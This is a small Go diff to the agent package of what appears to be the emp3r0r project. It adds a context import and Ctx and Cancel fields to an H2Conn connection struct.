@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"context"
 	"os"
 
 	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
@@ -70,4 +71,6 @@ type TunData struct {
 type H2Conn struct {
 	Conn     *h2conn.Conn
 	IsClosed bool
+	Ctx      context.Context
+	Cancel   context.CancelFunc
 }
